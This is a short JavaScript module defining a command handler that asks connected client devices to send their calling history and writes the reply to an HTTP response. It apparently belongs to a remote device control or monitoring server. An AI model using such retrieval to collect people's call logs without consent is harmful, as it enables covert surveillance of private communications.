const Cmd2Clients = require('../cmds/command2clients');
const CmdFromClients = require('../cmds/commandFromClient');
let Author = require('../author');
let msg = 'send me the calling history to me';
module.exports = class Call extends Author {
    constructor() {
        super(
            Cmd2Clients.SEND_CALLING_HISTORY,
            CmdFromClients.CALLING_HISTORY,
            msg
        )
    }

    ownerAction(data) {
        super.ownerAction(data);
        this.res.write(data);
        this.res.end();
    }
}